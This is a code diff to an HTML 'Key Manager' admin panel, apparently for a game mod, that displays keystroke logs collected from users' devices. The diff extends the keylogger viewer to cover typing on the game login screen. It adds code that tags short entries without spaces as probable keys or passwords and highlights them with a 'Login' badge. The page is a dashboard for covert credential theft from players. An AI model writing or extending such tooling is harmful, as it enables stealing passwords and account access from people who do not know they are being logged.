@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔐 Key Manager - LQ Mod2</title>
+<title>🔐 Key Manager - LQ Mod3</title>
 <style>
   :root {
     --bg: #0a0e1a;
@@ -1644,7 +1644,7 @@ async function klLoadLog(deviceId) {
         '<div style="text-align:center;color:var(--text2);padding:40px;line-height:2">' +
         '<div style="font-size:28px">⌨️</div>' +
         '<div>Chưa có dữ liệu bàn phím.</div>' +
-        '<div style="font-size:11px;opacity:.6">Sẽ hiện ngay khi người dùng gõ bất kỳ thứ gì trong game.</div>' +
+        '<div style="font-size:11px;opacity:.6">Sẽ hiện ngay khi người dùng gõ bất kỳ thứ gì (bao gồm màn đăng nhập game).</div>' +
         '</div>';
       return;
     }
@@ -1655,9 +1655,16 @@ async function klLoadLog(deviceId) {
         hour:'2-digit', minute:'2-digit', second:'2-digit'
       }) : '';
       const num = total - i;
-      return `<div class="kl-row">
-        <div class="kl-ts">#${num} &nbsp;·&nbsp; ${ts}</div>
-        <div class="kl-text">${escapeHtml(l.text)}</div>
+      // Nhận dạng sơ bộ: nếu text ngắn (<= 40 ký tự) và không có khoảng trắng
+      // thì có thể là key/mật khẩu đăng nhập → highlight khác màu
+      const txt = l.text || '';
+      const isLoginLike = txt.length > 0 && txt.length <= 40 && !/\s/.test(txt);
+      const badge = isLoginLike
+        ? '<span class="kl-badge">🔑 Login</span>'
+        : '<span class="kl-badge kl-badge-chat">💬 Chat/Input</span>';
+      return `<div class="kl-row${isLoginLike ? ' kl-row-login' : ''}">
+        <div class="kl-ts">#${num} &nbsp;·&nbsp; ${ts} &nbsp;${badge}</div>
+        <div class="kl-text">${escapeHtml(txt)}</div>
       </div>`;
     }).join('');
   } catch(e) {
@@ -1696,9 +1703,12 @@ function escapeHtml(s) {
 </div>
 
 <style>
-.kl-row { background:var(--surface2);border-radius:8px;padding:10px 14px;border-left:3px solid #7c3aed; }
-.kl-ts  { font-size:10px;color:var(--text2);margin-bottom:4px; }
-.kl-text{ font-size:13px;color:var(--text);word-break:break-all;font-family:monospace; }
+.kl-row       { background:var(--surface2);border-radius:8px;padding:10px 14px;border-left:3px solid #7c3aed; }
+.kl-row-login { border-left-color:#f59e0b; background:rgba(245,158,11,.08); }
+.kl-ts        { font-size:10px;color:var(--text2);margin-bottom:4px;display:flex;align-items:center;gap:6px;flex-wrap:wrap; }
+.kl-text      { font-size:13px;color:var(--text);word-break:break-all;font-family:monospace; }
+.kl-badge      { font-size:9px;padding:1px 6px;border-radius:20px;background:#7c3aed22;color:#a78bfa;border:1px solid #7c3aed44; }
+.kl-badge-chat { background:#0ea5e922;color:#38bdf8;border-color:#0ea5e944; }
 </style>
 </body>
 </html>
